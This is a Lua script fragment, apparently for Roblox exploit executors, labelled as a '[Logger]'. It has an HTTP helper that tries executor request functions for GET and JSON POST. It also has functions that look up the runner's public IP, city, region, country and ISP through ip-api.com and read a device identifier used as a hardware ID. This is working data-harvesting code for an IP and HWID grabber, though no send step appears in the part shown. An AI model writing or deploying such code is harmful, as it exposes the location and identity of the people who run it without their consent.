-- ------------------------------------------------------------------
-- HTTP Request (same style that worked in your test)
-- ------------------------------------------------------------------
local function httpRequest(url, method, body)
    method = method or "GET"
    body = body or ""

    local funcs = {request, http_request, syn and syn.request, httprequest}
    for _, func in ipairs(funcs) do
        if type(func) == "function" then
            if method == "GET" then
                local styles = {
                    function() return func({ Url = url, Method = "GET" }) end,
                    function() return func(url, "GET") end,
                    function() return func(url) end,
                }
                for _, style in ipairs(styles) do
                    local ok, res = pcall(style)
                    if ok and res then
                        local bodyOut = res.Body or res.Content or res.body or res
                        if type(bodyOut) == "string" and #bodyOut > 0 then
                            return bodyOut
                        end
                    end
                end
            elseif method == "POST" then
                local styles = {
                    function() return func({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body }) end,
                    function() return func(url, "POST", body) end,
                }
                for _, style in ipairs(styles) do
                    local ok, _ = pcall(style)
                    if ok then
                        return true
                    end
                end
            end
        end
    end
    return nil
end

-- ------------------------------------------------------------------
-- Get IP + Geolocation (ip-api.com)
-- ------------------------------------------------------------------
local function getIPInfo()
    local response = httpRequest("http://ip-api.com/json/", "GET")
    if not response then
        warn("[Logger] No IP response")
        return nil, nil, nil, nil, nil
    end

    local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
    if not ok or data.status ~= "success" then
        warn("[Logger] Failed to parse IP data")
        return nil, nil, nil, nil, nil
    end

    return data.query, data.city, data.regionName, data.country, data.isp
end

-- ------------------------------------------------------------------
-- Get HWID (Universal method via RbxAnalyticsService)
-- ------------------------------------------------------------------
local function getHWID()
    local success, hwid = pcall(function()
        return game:GetService("RbxAnalyticsService"):GetClientId()
    end)
    if success and hwid and hwid ~= "" then
        return hwid
    end
    -- Fallback to UserId if HWID fails
    return tostring(player.UserId)
end

